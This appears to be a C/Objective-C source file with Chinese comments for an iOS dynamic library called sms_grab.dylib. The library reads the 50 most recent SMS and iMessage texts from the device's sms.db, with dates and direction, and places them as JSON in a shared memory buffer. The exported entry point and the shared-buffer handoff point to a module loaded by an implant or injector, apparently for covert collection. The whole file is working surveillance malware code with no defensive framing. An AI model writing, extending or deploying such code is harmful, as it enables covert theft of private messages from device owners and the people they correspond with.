/**
 * sms_grab.dylib — iPad SMS/iMessage 采集模块
 *
 * 编译: xcrun --sdk iphoneos clang -arch arm64 -dynamiclib
 *          -fobjc-arc -mios-version-min=14.0
 *          -framework Foundation -lsqlite3
 *          -o sms_grab.dylib sms_grab.c
 *
 * 读取 /var/mobile/Library/SMS/sms.db 中的短信
 */

#import <Foundation/Foundation.h>
#import <sqlite3.h>
#import <stdint.h>
#import <string.h>

#define STATE_READY  7
#define MAX_OUTPUT   (8 * 1024 * 1024)
#define MAX_MSGS     50

static void write_buffer(uint32_t *buf, const char *json, size_t len) {
    if (len > MAX_OUTPUT - 8) len = MAX_OUTPUT - 8;
    memcpy((uint8_t *)buf + 8, json, len);
    buf[1] = (uint32_t)len;
    buf[0] = STATE_READY;
}

// 简单 JSON 字符串转义
static NSString *json_esc(NSString *s) {
    NSString *r = [s stringByReplacingOccurrencesOfString:@"\\" withString:@"\\\\"];
    r = [r stringByReplacingOccurrencesOfString:@"\"" withString:@"\\\""];
    r = [r stringByReplacingOccurrencesOfString:@"\n" withString:@"\\n"];
    r = [r stringByReplacingOccurrencesOfString:@"\r" withString:@"\\r"];
    return r;
}

__attribute__((visibility("default")))
void _process(uint32_t *shared) {
    @autoreleasepool {
        // ═══ 1. 打开 SMS 数据库 ════════════════════════════════
        const char *db_path = "/var/mobile/Library/SMS/sms.db";
        sqlite3 *db = NULL;
        int rc = sqlite3_open_v2(db_path, &db,
            SQLITE_OPEN_READONLY | SQLITE_OPEN_NOMUTEX, NULL);
        if (rc != SQLITE_OK) {
            char buf[200];
            snprintf(buf, sizeof(buf),
                "{\"error\":\"sms_db_open_failed\"}");
            write_buffer(shared, buf, strlen(buf));
            if (db) sqlite3_close(db);
            return;
        }

        // ═══ 2. 查询最近短信 ═══════════════════════════════════
        const char *sql =
            "SELECT m.rowid, m.text, m.date, m.is_from_me "
            "FROM message m "
            "WHERE m.text IS NOT NULL AND length(m.text) > 0 "
            "ORDER BY m.date DESC LIMIT 50";

        sqlite3_stmt *stmt = NULL;
        rc = sqlite3_prepare_v2(db, sql, -1, &stmt, NULL);
        if (rc != SQLITE_OK) {
            char buf[256];
            snprintf(buf, sizeof(buf),
                "{\"error\":\"query_failed\",\"msg\":\"%s\"}",
                sqlite3_errmsg(db));
            write_buffer(shared, buf, strlen(buf));
            sqlite3_close(db);
            return;
        }

        // ═══ 3. 构建 JSON ═════════════════════════════════════
        NSMutableString *json = [NSMutableString stringWithFormat:
            @"{\"status\":\"ok\",\"type\":\"sms\",\"messages\":["];

        NSDateFormatter *fmt = [[NSDateFormatter alloc] init];
        fmt.dateFormat = @"yyyy-MM-dd HH:mm:ss";
        fmt.timeZone = [NSTimeZone localTimeZone];

        NSUInteger count = 0;

        while (sqlite3_step(stmt) == SQLITE_ROW && count < MAX_MSGS) {
            int64_t rowid  = sqlite3_column_int64(stmt, 0);
            const char *txt = (const char*)sqlite3_column_text(stmt, 1);
            int64_t date   = sqlite3_column_int64(stmt, 2);
            int from_me    = sqlite3_column_int(stmt, 3);

            if (!txt) txt = "";

            // Apple epoch (2001-01-01) → NSDate
            NSDate *msgDate = [NSDate dateWithTimeIntervalSinceReferenceDate:(double)date];
            NSString *dateStr = [fmt stringFromDate:msgDate];

            // 构建条目（截断到 300 字符）
            NSString *text = json_esc([NSString stringWithUTF8String:txt]);
            if (text.length > 300)
                text = [[text substringToIndex:300] stringByAppendingString:@"..."];

            if (count > 0) [json appendString:@","];
            [json appendFormat:
                @"{\"id\":%lld,\"text\":\"%@\",\"date\":\"%@\",\"from_me\":%s}",
                rowid, text, dateStr ?: @"unknown", from_me ? "true" : "false"];
            count++;

            if (json.length > MAX_OUTPUT - 2048) break;
        }

        [json appendString:@"]}"];

        // ═══ 4. 清理 ═════════════════════════════════════════
        sqlite3_finalize(stmt);
        sqlite3_close(db);

        // ═══ 5. 写入共享内存 ═══════════════════════════════════
        const char *cstr = [json UTF8String];
        write_buffer(shared, cstr, strlen(cstr));
    }
}
